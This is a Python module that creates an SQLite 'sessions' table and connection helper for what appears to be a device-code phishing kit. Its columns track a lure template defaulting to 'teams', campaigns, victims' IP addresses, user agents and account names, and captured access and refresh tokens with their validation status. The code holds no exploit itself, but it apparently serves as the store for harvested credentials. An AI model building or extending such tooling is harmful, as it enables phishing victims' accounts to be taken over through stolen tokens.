import sqlite3
from contextlib import contextmanager
from config import DB_PATH

SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    user_code       TEXT UNIQUE NOT NULL,
    device_code     TEXT NOT NULL,
    template        TEXT DEFAULT 'teams',
    campaign        TEXT DEFAULT '',
    remote_ip       TEXT DEFAULT '',
    user_agent      TEXT DEFAULT '',
    created_at      INTEGER NOT NULL,
    expires_at      INTEGER NOT NULL,
    status          TEXT DEFAULT 'pending',
    client_mode     TEXT DEFAULT '',
    upn             TEXT DEFAULT '',
    access_token    TEXT DEFAULT '',
    refresh_token   TEXT DEFAULT '',
    token_expires   INTEGER DEFAULT 0,
    last_validated  INTEGER DEFAULT 0,
    validation      TEXT DEFAULT '',
    raw             TEXT DEFAULT ''
);
CREATE INDEX IF NOT EXISTS idx_status  ON sessions(status);
CREATE INDEX IF NOT EXISTS idx_upn     ON sessions(upn);
CREATE INDEX IF NOT EXISTS idx_created ON sessions(created_at);
"""

def init():
    with sqlite3.connect(DB_PATH) as c:
        c.execute("PRAGMA journal_mode=WAL;")
        c.executescript(SCHEMA)
        cols = {r[1] for r in c.execute("PRAGMA table_info(sessions)").fetchall()}
        if "client_mode" not in cols:
            c.execute("ALTER TABLE sessions ADD COLUMN client_mode TEXT DEFAULT ''")

@contextmanager
def conn():
    c = sqlite3.connect(DB_PATH, timeout=10)
    c.row_factory = sqlite3.Row
    try:
        yield c
        c.commit()
    finally:
        c.close()